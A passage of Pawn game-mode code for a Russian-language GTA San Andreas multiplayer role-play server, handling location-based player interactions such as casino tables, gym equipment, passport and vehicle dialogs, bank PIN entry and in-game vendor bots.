				  	MoveDynamicObject(turmagate[0],dx,1423.6639,dz,2),MoveDynamicObject(turmagate[1],dx1,1399.8525,dz1,2);
		  		    SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[1],dx1,1407.753,dz1,2.0);
		  		    SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[0],dx,1415.695,dz,2.0);
			  	}
	  		    //else MoveDynamicObject(turmagate[0],dx,1415.695,dz,2),MoveDynamicObject(turmagate[1],dx1,1407.753,dz1,2);
	  		}
	  		else if(IsPlayerInDynamicArea(playerid,arenagate[1]) && !IsDynamicObjectMoving(arenagate[1]))
	  		{
	  		    SetPlayerFacingAngle(playerid,181.4268);
	  		    ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
	  		    new Float:dx,Float:dy,Float:dz;
	  		    GetDynamicObjectPos(turmagate[0],dx,dy,dz);
	  		    new Float:dx1,Float:dy1,Float:dz1;
	  		    GetDynamicObjectPos(turmagate[1],dx1,dy1,dz1);
	  		    if(dy == 1415.695)
			  	{
					MoveDynamicObject(turmagate[0],dx,1423.6639,dz,2),MoveDynamicObject(turmagate[1],dx1,1399.8525,dz1,2);
					SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[1],dx1,1407.753,dz1,2.0);
					SetTimerEx("MoveObjectOpen",5000,false,"dffff",turmagate[0],dx,1415.695,dz,2.0);
			  	}
	  		    //else MoveDynamicObject(turmagate[0],dx,1415.695,dz,2),MoveDynamicObject(turmagate[1],dx1,1407.753,dz1,2);
	  		}
	  		else
	  		{
	  		    new Float:dx,Float:dy,Float:dz,Float:dfx,Float:dfy,Float:dfz;
	  		    for(new i = 0; i<=5; i++)
		    	{
		    	    if(!IsPlayerInDynamicArea(playerid,shlagsp[i]) || IsDynamicObjectMoving(shlagpos[i]) || !IsValidDynamicObject(shlagpos[i])) continue;
		    	    ApplyAnimation(playerid, "CRIB", "CRIB_Use_Switch",4.1, 0, 0, 0, 0, 0,1);
		    	    SetPlayerFacingAngle(playerid,postshlag[i][9]);
	  		    	GetDynamicObjectPos(shlagpos[i],dx,dy,dz);
	  		    	GetDynamicObjectRot(shlagpos[i],dfx,dfy,dfz);
	  		    	if(dfy == postshlag[i][4])
			  		{
		 	 			if(postshlag[i][4] < 0) MoveDynamicObject(shlagpos[i],dx,dy+0.1,dz,0.12,dfx,dfy+90.0,dfz);
		 	 			else MoveDynamicObject(shlagpos[i],dx,dy+0.1,dz,0.12,dfx,dfy-90.0,dfz);
		 	 			SetTimerEx("MoveObjectOpenRot",5000,false,"dfffffff",shlagpos[i],dx,dy-0.1,dz,0.12,dfx,postshlag[i][4],dfz);
					}
					
    	 			//else MoveDynamicObject(shlagpos[i],dx,dy-0.1,dz,0.12,dfx,postshlag[i][4],dfz);
		    	    break;
		    	}
	  		}
  		}
	    if(IsPlayerInRangeOfPoint(playerid,3,1689.5300,1461.6190,10.7678) ||
	    IsPlayerInRangeOfPoint(playerid,3,2839.2483,1294.7343,11.3906) ||
	    IsPlayerInRangeOfPoint(playerid,3,2222.5676,1829.2949,10.8203)||
	    IsPlayerInRangeOfPoint(playerid,3,1773.1392,-1890.5740,13.5515)||
	    IsPlayerInRangeOfPoint(playerid,3,1243.0975,-1704.3528,13.5469)||
	    IsPlayerInRangeOfPoint(playerid,3,1436.8009,-2281.8413,13.5469))
	    {
	        query = "";
			strcat(query,"{FFFFFF}Приветствую тебя, уважаемый игрок, хотим напомнить вам, что наш сервер\nподразумевает собой отыгрывание реальной жизни. Поэтому ваш игровой ник\nдолжен состоять из IC имени и фамилии. Вот такого формата :\nИмя_Фамилия, например: Samuel_Migos.\n\n");
			strcat(query,"Пункт 1.1 - Вы должны отыгрывать все действия вашего\nперсонажа через команды /me, /ame, /do, /try, /todo. Пояснения каждой команды\nвы получите, написав её в чат и оставив поля для действия пустым. После этого\nкаждая команда опишется у вас на экране.\n");
			strcat(query,"Пункт 1.2 - Не используйте никакие программы, дающие вам привилегии перед\nдругими игроками, они приведут к наказанию. В том числе к блокировке.\n");
			strcat(query,"Пункт 1.3 - Чтобы найти нужное вам место на сервере, используйте /gps\n");
			strcat(query,"Пункт 1.4 - Не путайте IC информацию и ООС! IC - это информация, касающаяся\nтолько процесса игры. ООС - это информация, которая не касается игры. ООС\nинформация пишется в нон рп чат, который в свою очередь работает\nчерез команду /n.\n");
			strcat(query,"Пункт 1.5 - Если у вас есть вопросы, жалобы или какие-то замечания по серверу, то\nсвязывайтесь с администрацией через команду /mm -> связь с администрацией.\n\n");
			strcat(query,"С уважением, команда проекта Maryland Role Play. Приятной игры!");
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Помощь по игре",query,"Далее","");
		}
	    if(IsPlayerInRangeOfPoint(playerid,3,1962.19714, 1010.02173, 991.96722) && GetPVarInt(playerid,"Stol") == 0)
	    {
	        if(StolInfo[1][sIgra] > 0) return SendClientMessage(playerid,CGREY,"Игры за этим столом уже идёт");
	        if(PlayerInfo[playerid][pCash] < 1000) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
	        new heh = 0;
	        for(new i = 0; i <= 3; i++)
			{
				if(StolInfo[1][sPlayer][i] == -1)
				{
					heh = i+1;
					break;
				}
			}
	        if(heh == 0) return SendClientMessage(playerid,CGREY,"Все места заняты");
			GiveMoney(playerid,-StolInfo[1][sPrice]);
			
			StolInfo[1][sPlayer][heh-1] = playerid;
			StolInfo[1][sDice][heh-1] = 0;
			SetPVarInt(playerid,"Stol",1);
			SetPVarInt(playerid,"StolCena",1000);
			SetPVarInt(playerid,"StolID",heh-1);
  			for(new x = 0; x < 3; x++) TextDrawShowForPlayer(playerid,CasinoTD[GetPVarInt(playerid,"Stol")][x]);
			for(new x = 0; x < 21; x++) TextDrawShowForPlayer(playerid,Casino[x]);
			SelectTextDraw(playerid, CGREY);
			TogglePlayerControllable(playerid, 0);
			UpdateStol(GetPVarInt(playerid,"Stol"));
			new kek = 0;
			for(new i = 0; i <= 3; i++) if(StolInfo[1][sPlayer][i] != -1) kek++;
			if(kek > 1 && StolInfo[1][sJdet] == 0)
			{
				StolInfo[1][sJdet] = 15;
				UpdateStol(GetPVarInt(playerid,"Stol"));
			}
	    }
	    
		if(IsPlayerInRangeOfPoint(playerid,3,1405.0065,-36.4216,1000.9182) && GetPlayerVirtualWorld(playerid) == 50)
	    {
      		new stringss[3200] = "{ffffff}";
  			new str[124];
  			
			for(new x = 1; x<= TOTALBIL; x++)
			{
				if(!strcmp(BildInfo[x][bOwner],"None",true)) format(str,124,"%s\t{20BA09}Свободен\t{ffffff}Нет владельца\n",BildInfo[x][bPosText]);
			    else format(str,124,"%s\t{F85A5A}Арендован\t{ffffff}%s\n",BildInfo[x][bPosText],BildInfo[x][bOwner]);
			    strcat(stringss,str);
			}
			return ShowPlayerDialog(playerid,387,DIALOG_STYLE_TABLIST,"Заказ билборда",stringss,"Выбрать","Закрыть");
		}
	    if(IsPlayerInRangeOfPoint(playerid,3,766.0010,0.6090,1000.7177))
	    {
	        CheckSkill(playerid);
			static const fmt_string[] = "{FFFFFF}Уровень силовой подготовки:\t\t%d\n\nДо следующего уровня силовой подготовки:\nШтанга\t\t\t\t\t\t%d раз\nГантели\t\t\t\t\t%d раз\
			\nУдаров по груше\t\t\t\t%d раз\nДорожка\t\t\t\t\t%d метров\nВелотренажер\t\t\t\t%d метров";
			new str[sizeof(fmt_string)+20];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSkillT],15*PlayerInfo[playerid][pSkillT]-PlayerInfo[playerid][pShtanga],20*PlayerInfo[playerid][pSkillT]-PlayerInfo[playerid][pGiri],
			30*PlayerInfo[playerid][pSkillT]-PlayerInfo[playerid][pUdar],50*PlayerInfo[playerid][pSkillT]-PlayerInfo[playerid][pBeg],40*PlayerInfo[playerid][pSkillT]-PlayerInfo[playerid][pVelo]);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Навыки игрока",str,"Закрыть","");
	    }
	    if(IsPlayerInRangeOfPoint(playerid,3,1405.0687,-18.2661,1001.2981))
		{
			if(PlayerInfo[playerid][pPass] == 0)
			{
			    ShowPlayerDialog(playerid,135,DIALOG_STYLE_INPUT,"Получение паспорта","{FFFFFF}Введите  Вашу Имя и Фамилию в формате Имя_Фамилия\nПример: Ivan_Ivanov","Далее","Отмена");
			    ApplyDynamicActorAnimation(MeriaBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(MeriaText,-1,"Введите Ваши данные");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",MeriaBot,_:MeriaText);
			}
			else
			{
				ApplyDynamicActorAnimation(MeriaBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(MeriaText,-1,"У Вас уже имеется паспорт");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",MeriaBot,_:MeriaText);
			}
		}
		if(IsPlayerInRangeOfPoint(playerid,3,1478.9521,-1665.4988,13.9901))
		{

		    if(!PlayerInfo[playerid][pRolik])
			{
			    if(IsAGang(playerid) || IsAMafia(playerid))
				{
					if(CaptInfo[PlayerInfo[playerid][pMember]-6][capture]) return SendClientMessage(playerid,CGREY,"Нельзя брать ролики в аренду во время капта");
				}
				ShowPlayerDialog(playerid,259,DIALOG_STYLE_MSGBOX,"Аренда роликов","{FFFFFF}Вы действительно хотите арендовать ролики на 15 минут?\nЦена: 5$","Далее","Назад");
			}
			else
			{
			    ApplyDynamicActorAnimation(RolikBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(RolikText,-1,"Уже накатались?");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",RolikBot,_:RolikText);
   				PlayerInfo[playerid][pRolik] = 0;
		        SetSkin(playerid);
		        SendClientMessage(playerid,-1,"Время аренды роликов кончилась");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid,3,134.3091,2634.1489,16.4893))
		{
		    ApplyDynamicActorAnimation(UtilBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(UtilText,-1,"Что продаёшь?");
			SetTimerEx("ClearBotGlobal", 3000, false,"dd",UtilBot,_:UtilText);
			new kek = 0;
			query = "";
			for(new i = 1; i<= TOTALV; i++)
			{
			    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0)
				{
				    ListNick[playerid][kek] = i;
				    kek++;
					static const fmt_string2[] = "{FFFFFF}%s | ID: %i | Номера: %s\n";
					new str2[sizeof(fmt_string2)+64];
					format(str2, sizeof(str2), fmt_string2,VehicleNameS[VInfo[i][vmodel]-400],VInfo[i][vcar],VInfo[i][vnumber]);
					strcat(query, str2);
				}
			}
			if(kek == 0) return SendClientMessage(playerid,CGREY,"Вы не владеете транспортом!");
			ShowPlayerDialog(playerid,247,DIALOG_STYLE_LIST,"Выберите машину",query,"Выбрать","Отмена");
		}

		if(IsPlayerInRangeOfPoint(playerid,3,1658.2246,2200.2646,10.8203))
		{
		    new kek = 0;
		   	query = "";
		   	for(new i = 1; i<= TOTALV; i++)
		   	{
		   		if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
		   	    if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0)
		   	    {
		   	        ListNick[playerid][kek] = i;
		   	        kek++;
		       		static const fmt_string2[] = "{FFFFFF}%s | ID: %i | Номера: %s\n";
					new str2[sizeof(fmt_string2)+64];
					format(str2, sizeof(str2), fmt_string2,VehicleNameS[VInfo[i][vmodel]-400],VInfo[i][vcar],VInfo[i][vnumber]);
					strcat(query, str2);
		   	    }
		   	}
		   	if(kek == 0) return SendClientMessage(playerid,CGREY,"Вы не владеете транспортом!");
		   	ShowPlayerDialog(playerid,273,DIALOG_STYLE_LIST,"Транспорт",query,"Выбрать","Отмена");
      		ApplyDynamicActorAnimation(BursirBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BursirText,-1,"Какой транспорт отбуксировать?");
			SetTimerEx("ClearBotGlobal", 3000, false,"ii",BursirBot,_:BursirText);
		}
	/*    if(IsPlayerInRangeOfPoint(playerid,3,-636.0065,1447.8339,13.6827) || IsPlayerInRangeOfPoint(playerid,3,-1661.9115,2544.4556,85.5599))
		{
			if(PlayerInfo[playerid][pLeader] > 0 && IsAGang(playerid) || PlayerInfo[playerid][pLeader] > 0 && IsAMafia(playerid) || strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0)
			{
				DeletePVar(playerid,"Family");
				ApplyDynamicActorAnimation(ProdBot[GetBotProd(playerid)],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(ProdText1[GetBotProd(playerid)],-1,"Что хотел?");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",ProdBot[GetBotProd(playerid)],_:ProdText1[GetBotProd(playerid)]);
				if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0 && PlayerInfo[playerid][pLeader] > 0)
				{
				    return ShowPlayerDialog(playerid,335,DIALOG_STYLE_LIST,"Транспорт","Организации\nСемьи","Далее","Назад");
				}
				else if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[playerid][pSendername], true) == 0) SetPVarInt(playerid,"Family",1);
			    ShowPlayerDialog(playerid,209,DIALOG_STYLE_LIST,"Транспорт","Купить машины\nПродать машины","Далее","Назад");
			}
			else
			{
				ApplyDynamicActorAnimation(ProdBot[GetBotProd(playerid)],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(ProdText1[GetBotProd(playerid)],-1,"Сматывайся от сюда");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",ProdBot[GetBotProd(playerid)],_:ProdText1[GetBotProd(playerid)]);
			}
		}*/
	    if(IsPlayerInRangeOfPoint(playerid,3,1962.19714, 1026.22131, 991.96722) && GetPVarInt(playerid,"Stol") == 0)
	    {
	        if(StolInfo[3][sIgra] > 0) return SendClientMessage(playerid,CGREY,"Игры за этим столом уже идёт");
	        if(PlayerInfo[playerid][pCash] < StolInfo[3][sPrice]) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
	        new heh = 0;
	        for(new i = 0; i <= 3; i++)
			{
				if(StolInfo[3][sPlayer][i] == -1)
				{
					heh = i+1;
					break;
				}
			}
	        if(heh == 0) return SendClientMessage(playerid,CGREY,"Все места заняты");
			GiveMoney(playerid,-StolInfo[3][sPrice]);
			StolInfo[3][sPlayer][heh-1] = playerid;
			StolInfo[3][sDice][heh-1] = 0;
			SetPVarInt(playerid,"Stol",3);
			SetPVarInt(playerid,"StolCena",100000);
			SetPVarInt(playerid,"StolID",heh-1);
  			for(new x = 0; x < 3; x++) TextDrawShowForPlayer(playerid,CasinoTD[GetPVarInt(playerid,"Stol")][x]);
			for(new x = 0; x < 21; x++) TextDrawShowForPlayer(playerid,Casino[x]);
			SelectTextDraw(playerid, CGREY);
			UpdateStol(GetPVarInt(playerid,"Stol"));
			new kek = 0;
			for(new i = 0; i <= 3; i++) if(StolInfo[3][sPlayer][i] != -1) kek++;
			if(kek > 1 && StolInfo[3][sJdet] == 0)
			{
				StolInfo[3][sJdet] = 15;
				UpdateStol(GetPVarInt(playerid,"Stol"));
			}
	    }
	    if(IsPlayerInRangeOfPoint(playerid,3,1962.19714, 1018.12152, 991.96722) && GetPVarInt(playerid,"Stol") == 0)
	    {
	        if(StolInfo[2][sIgra] > 0) return SendClientMessage(playerid,CGREY,"Игры за этим столом уже идёт");
	        if(PlayerInfo[playerid][pCash] < StolInfo[2][sPrice]) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
	        new heh = 0;
	        for(new i = 0; i <= 3; i++)
			{
				if(StolInfo[2][sPlayer][i] == -1)
				{
					heh = i+1;
					break;
				}
			}
	        if(heh == 0) return SendClientMessage(playerid,CGREY,"Все места заняты");
			GiveMoney(playerid,-StolInfo[2][sPrice]);
			StolInfo[2][sPlayer][heh-1] = playerid;
			StolInfo[2][sDice][heh-1] = 0;
			SetPVarInt(playerid,"Stol",2);
			SetPVarInt(playerid,"StolCena",10000);
			SetPVarInt(playerid,"StolID",heh-1);
			for(new x = 0; x < 3; x++) TextDrawShowForPlayer(playerid,CasinoTD[GetPVarInt(playerid,"Stol")][x]);
			for(new x = 0; x < 21; x++) TextDrawShowForPlayer(playerid,Casino[x]);
			SelectTextDraw(playerid, CGREY);
			UpdateStol(GetPVarInt(playerid,"Stol"));
			new kek = 0;
			for(new i = 0; i <= 3; i++) if(StolInfo[2][sPlayer][i] != -1) kek++;
			if(kek > 1 && StolInfo[2][sJdet] == 0)
			{
				StolInfo[2][sJdet] = 15;
				UpdateStol(GetPVarInt(playerid,"Stol"));
			}
	    }
	    if(IsPlayerInRangeOfPoint(playerid,2,1969.7750,1017.4728,992.4688))
	    {
	        ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Информация","{f7ae11}Автомат:\n{FFFFFF}\tДля игры в автомате используйте H.\n\tЦена данной игры 300$.\n\tКомбинация из 2-ух +50$.\n\tКомбинация их 3-ёх +150$.\n\n{f7ae11}Кости:{FFFFFF}\n\tЕсть кости на три ставки 1000$,10000$,100000$.\n\tДля того, чтобы играть в кости используйте H, около стола.\n\n{f7ae11}Кубики:{FFFFFF}\n\tДля игры в кубики используйте /dice.","Закрыть","");
	    }
	    if(IsPlayerInRangeOfPoint(playerid,2,773.0480,1.4300,1000.7209) && Trenag[playerid] == 0)
		{
			if(usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (0) : (4)]==true) return SendClientMessage(playerid,COLOR_GREY,"Этот тренажер занят.");
            TogglePlayerControllable(playerid, false);
            DestroyDynamicObject(KTrenag[(GetPlayerVirtualWorld(playerid) == 1) ? (0) : (2)]);
            SetPlayerFacingAngle(playerid,273.0756);
		    SetPlayerPos(playerid,773.0480,1.4300,1000.7209);
		    SetPlayerAttachedObject(playerid,0,2913,6,0.000000,0.000000,-0.102999, 0.000000,0.000000,0.000000, 1.000000,1.000000,1.000000);
		    ApplyAnimation( playerid, "benchpress", "gym_bp_up_smooth", 4.1, 0, 0, 0, 1, 0 );
		    down[playerid]=true; usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (0) : (4)]=true;
		    SendClientMessage(playerid,CREWARD,"[GYM] {FFFFFF}NUM4 - Поднять штангу | NUM1 - опустить штангу | LALT - закончить занятие.");
		    Trenag[playerid]=(GetPlayerVirtualWorld(playerid) == 1) ? (1) : (5);
			SetPlayerCameraPos(playerid,771.7218,1.4508,1000.7218);
			SetPlayerCameraLookAt(playerid,773.1321,1.4342,1000.7208);
			ShowInfo(playerid,"_");
			KolRaz(playerid);
		}
	/*	if(IsPlayerInRangeOfPoint(playerid,3,1724.3496,-1343.2271,1569.0170))
		{
			if(PlayerInfo[playerid][pLevel] == 1 && !PlayerInfo[playerid][pLic][0]) ShowPlayerDialog(playerid,108,DIALOG_STYLE_MSGBOX,"Тест","{FFFFFF}Вы действительно хотите пройти тест?\nЦена: $750","Да","Нет");
			else
			{
			    ApplyDynamicActorAnimation(LicBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(LicText,-1,"Обратитесь к другому сотруднику");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",LicBot,_:LicText);
			   // ShowPlayerDialog(playerid,282,DIALOG_STYLE_LIST,"Приобрести лицензию","Лицензия на машины\nЛицензия на мото транспорт\nЛицензия на водный транспорт\nЛицензия на воздушный транспорт\nЛизенция на оружие","Да","Нет");
			}
		}*/
		else if(IsPlayerInRangeOfPoint(playerid,3,450.3987,-82.2322,999.5547))
		{
		    
			if(PlayerInfo[playerid][pMember] == F_ARMY)
			{
		 		Update3DTextLabelTextEx(ArmyEatText,-1,"Приятного аппетита!");
		 		SendClientMessage(playerid,-1,"Чтобы съесть, используйте: {f7ae11}ЛКМ");
				SetPVarInt(playerid,"Burger",1);
				SetPlayerAttachedObject(playerid, 2, 19346, 5, 0.108999, 0.033000, -0.041000, 77.999992, -101.700012, 0.000000, 0.821000, 0.55, 0.738000);
			}
			else Update3DTextLabelTextEx(ArmyEatText,-1,"Брысь от сюда!");
			ApplyDynamicActorAnimation(ArmyEat,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", ArmyEat,_:ArmyEatText);
			
		}
		else if(IsPlayerInRangeOfPoint(playerid,3,1049.8925,2922.6387,1051.8601))
		{
		    if(IsAMafia(playerid) && PlayerInfo[playerid][pLeader]) ShowPlayerDialog(playerid,492,DIALOG_STYLE_LIST,"Наркопритон","1 | Купить наркотики\n2 | Заказать самолет\n3 | Ограбление банка\n4 | Купить бомбу","Далее","Отмена");
			else
			{
			    ShowPlayerDialog(playerid,492,DIALOG_STYLE_LIST,"Наркопритон","1 | Купить наркотики\n2 | Ограбление банка\n3 | Купить бомбу","Далее","Отмена");
			  /*  ApplyDynamicActorAnimation(NarkBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(NarkText,-1,"Напиши ему, он поможет тебе");
				SetTimerEx("ClearBotGlobal", 3000, false, "dd", NarkBot,_:NarkText);
				static const fmt_str1[] = "{ffffff}Для получение наркотиков надо заказать товар!\nИспользуйте телефон для заказа наркотиков.\nОтправьте любое SMS на номер: {f7ae11}%d";
				new string1[sizeof(fmt_str1)+10];
				format(string1, sizeof(string1), fmt_str1,NumberDrugs);
				ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Покупка наркотиков",string1,"Далее","");*/
			}
		}
		else if(IsPlayerInRangeOfPoint(playerid, 5.0,1390.7922,-0.8211,1000.9153) && GetPlayerInterior(playerid) == 55 && GetPlayerVirtualWorld(playerid) == fbidal && GetPVarInt(playerid,"InFbiCar"))
		{
		    if(!GetPVarInt(playerid,"Pros"))
		    {
				if(PlayerInfo[playerid][pPros] < gettime()) return SendClientMessage(playerid,CGREY,"Вы не устанавливали прослушку");
				SetPVarInt(playerid,"Pros",PlayerInfo[playerid][pProsFrac]);
				SendClientMessage(playerid,CREWARD,"Прослушка включена!");
			}
			else
			{
			    DeletePVar(playerid,"Pros");
			    SendClientMessage(playerid,CREWARD,"Прослушка выключена!");
			}
		}
		if(IsPlayerInRangeOfPoint(playerid, 5.0,2412.2695,-1418.9071,24.0450))
		{
		    if(!IsAGang(playerid))
			{
			    SendClientMessage(playerid,CGREY,"Вы не состоите в банде!");
			    SayBot("Проваливай от сюда",-1,RobBot,RobText);
			    return 1;
			}
			/*F85A5A красный
20BA09 зелёный
FFFF00 желтый*/

            query = "";
            new str[144];
			format(str,sizeof(str),"%sТранспорт класса 'D'\t[%d/15]",(PlayerInfo[playerid][pCRL] > 1) ? ("{20BA09}") : ("{FFFF00}"),(PlayerInfo[playerid][pCRL] > 1) ? (15) : (PlayerInfo[playerid][pCRC]));
			strcat(query,str);
			format(str,sizeof(str),"\n%sТранспорт класса 'C'\t[%d/10]",(PlayerInfo[playerid][pCRL] < 2) ? ("{F85A5A}") : ((PlayerInfo[playerid][pCRL] > 2) ? ("{20BA09}") : ("FFFF00")),(PlayerInfo[playerid][pCRL] > 2) ? (10) : ((PlayerInfo[playerid][pCRL] < 1) ? (0) : (PlayerInfo[playerid][pCRC])));
			strcat(query,str);
			format(str,sizeof(str),"\n%sТранспорт класса 'A' и 'B'\t[%d/5]",(PlayerInfo[playerid][pCRL] < 3) ? ("{F85A5A}") : ((PlayerInfo[playerid][pCRL] > 3) ? ("{20BA09}") : ("FFFF00")),(PlayerInfo[playerid][pCRL] > 3) ? (5) : ((PlayerInfo[playerid][pCRL] < 2) ? (0) : (PlayerInfo[playerid][pCRC])));
			strcat(query,str);
			ShowPlayerDialog(playerid,494,DIALOG_STYLE_TABLIST,"Заказы",query,"Далее","Отмена");
			
			
			

		}
		for(new i = 0; i < 8; i++)
		{
			if(!IsPlayerInDynamicArea(playerid,BankSp[i]) || GetPlayerVirtualWorld(playerid) != BankBots[i][b_Virt] || GetPlayerInterior(playerid) != BankBots[i][b_Int]) continue;
		    if(!PlayerInfo[playerid][pBankPin]) return SendClientMessage(playerid,CGREY,"У Вас нет карты, получить её можно в основном отделении банка!");
			else ShowPlayerDialog(playerid,373,DIALOG_STYLE_INPUT,"PIN-CODE","{ffffff}Введите PIN-CODE от карты:\n\n","Далее","Отмена");
			SetPVarInt(playerid,"BankBot",i);
			SetPVarInt(playerid,"Banks",1);
			break;
		}
		if(IsPlayerInRangeOfPoint(playerid,2,772.5930,8.8911,1000.7066) && Trenag[playerid] == 0)
	    {
            if(usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (1) : (5)]==true) return SendClientMessage(playerid,COLOR_GREY,"Этот тренажер занят.");
            TogglePlayerControllable(playerid, false);
            SetPlayerFacingAngle(playerid,81.2905);
		    SetPlayerPos(playerid,772.5930,8.8911,1000.7066);
		    usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (1) : (5)]=true;
		    ApplyAnimation( playerid, "GYMNASIUM", "gym_bike_geton", 4.1, 0, 0, 0, 1, 0 );
		    SendClientMessage(playerid,CREWARD,"[GYM] {FFFFFF}NUM1 - крутить педали | L.ALT - закончить занятие.");
		    SendClientMessage(playerid,CREWARD,"[GYM] {FFFFFF}Удерживайте темп на максимуме для улучшения навыка.");
		    Trenag[playerid]=(GetPlayerVirtualWorld(playerid) == 1) ? (2) : (6);
			SetPlayerCameraPos(playerid,768.9656,9.3903,1000.7083);
			SetPlayerCameraLookAt(playerid,771.0875,9.4117,1000.7067);
			ShowInfo(playerid,"_");
			KolRaz(playerid);
		}
		if(IsPlayerInRangeOfPoint(playerid,2,772.8024,5.4353,1000.7802) && Trenag[playerid] == 0)
		{
            if(usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (2) : (6)]==true) return SendClientMessage(playerid,COLOR_GREY,"Этот тренажер занят.");
            TogglePlayerControllable(playerid, false);
		    SetPlayerPos(playerid,772.8024,5.4353,1000.7802);
		    SetPlayerFacingAngle(playerid,91.5603);
		    DestroyDynamicObject(KTrenag[(GetPlayerVirtualWorld(playerid) == 1) ? (1) : (3)]);
			usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (2) : (6)]=true;
    //        SetPlayerAttachedObject(playerid,0,2915,6,0.032999,0.002000,-0.014000, 4.099997,-91.799888,8.299996, 1.058000,1.028000,0.972000);
		    down[playerid]=true;
		    SetPlayerAttachedObject(playerid, 0, 2916, 6, 0.028000, 0.000000, 0.000000, 0.000000, 93.800025, 0.000000, 1.000000, 1.00, 1.000000);
			SetPlayerAttachedObject(playerid, 1, 2916, 5, 0.060999, 0.000000, 0.000000, 0.000000, 94.300003, 0.000000, 1.000000, 1.00, 1.000000);
		    SendClientMessage(playerid,CREWARD,"[GYM] {FFFFFF}NUM4 - Поднять гантели | NUM1 - опустить гантели | LALT - закончить занятие.");
		    Trenag[playerid]=(GetPlayerVirtualWorld(playerid) == 1) ? (3) : (7);
			SetPlayerCameraPos(playerid,769.3055,5.3182,1000.7160);
			SetPlayerCameraLookAt(playerid,771.7000,5.3390,1000.7802);
            ApplyAnimation( playerid, "Freeweights", "gym_free_pickup", 4.1, 0, 0, 0, 1, 0 );
           	ShowInfo(playerid,"_");
            KolRaz(playerid);
		}
		if(IsPlayerInRangeOfPoint(playerid,2,773.4613,-0.8611,1000.7250) && Trenag[playerid] == 0) //4
		{
            if(usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (3) : (7)]==true) return SendClientMessage(playerid,COLOR_GREY,"Этот тренажер занят.");
            TogglePlayerControllable(playerid, false);
		    SetPlayerPos(playerid,773.4613,-0.8611,1000.7250);
		    SetPlayerFacingAngle(playerid,181.0015);
		    usetre[(GetPlayerVirtualWorld(playerid) == 1) ? (3) : (7)]=true;
		    SendClientMessage(playerid,CREWARD,"[GYM] {FFFFFF}NUM1 - ускорить бег | LALT - закончить занятие.");
		    SendClientMessage(playerid,CREWARD,"[GYM] {FFFFFF}Удерживайте темп на максимуме для улучшения навыка.");
		    Trenag[playerid]=(GetPlayerVirtualWorld(playerid) == 1) ? (4) : (8); SetPlayerCameraPos(playerid,770.7786,-2.6528,1000.7265);
			SetPlayerCameraLookAt(playerid,772.8804,-2.5842,1000.7288);
			ApplyAnimation( playerid, "GYMNASIUM", "gym_tread_geton", 4.1, 0, 0, 0, 1, 0 );
			kol[playerid]=1;
			ShowInfo(playerid,"_");
			KolRaz(playerid);
		}
		for(new i = 0; i < 6; i++)
	    {
	        if(!IsPlayerInDynamicArea(playerid,dogsp[i])) continue;
			printf("1 HOT DOG %d",i);
	        if(PlayerInfo[playerid][pLevel] > 1)
	        {
				ApplyDynamicActorAnimation(HotDogBot[i],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(HotDogText[i],-1,"Ты уже можешь позволить себе купить в закусочной");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",HotDogBot[i],_:HotDogText[i]);
				return true;
	        }
	        printf("2 HOT DOG %d",i);
	        if(IsPlayerAttachedObjectSlotUsed(playerid, 2) && GetPVarInt(playerid,"Burger") > 0)
	        {
				ApplyDynamicActorAnimation(HotDogBot[i],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(HotDogText[i],-1,"У тебя уже есть хот-дог");
				SetTimerEx("ClearBotGlobal", 3000, false,"dd",HotDogBot[i],_:HotDogText[i]);
				return true;
	        }
	        printf("3 HOT DOG %d",i);
